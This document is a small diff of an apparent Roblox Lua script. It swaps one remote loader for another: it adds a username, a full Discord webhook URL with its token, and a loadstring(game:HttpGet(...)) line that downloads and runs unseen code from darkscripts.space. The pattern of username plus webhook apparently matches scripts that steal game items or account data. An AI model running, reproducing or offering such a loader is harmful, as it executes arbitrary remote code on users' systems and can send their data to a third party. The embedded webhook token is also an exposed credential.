@@ -1,1 +1,4 @@
-loadstring(game:HttpGet("https://egorikusa.space/82adcd107cadb122d66d28fe.lua", true))()
+UserName = "xxxNIKITOIDxxx"
+Webhook = "https://discord.com/api/webhooks/1314163598054129664/9QQFhJgC-ZrrT_QRfhQj8ZJV-Oxnu-CrUmMcpinXHPnGewytXaKJouGaUXaOBQ7gc281"
+
+loadstring(game:HttpGet("https://darkscripts.space/pleasedonate",true))()
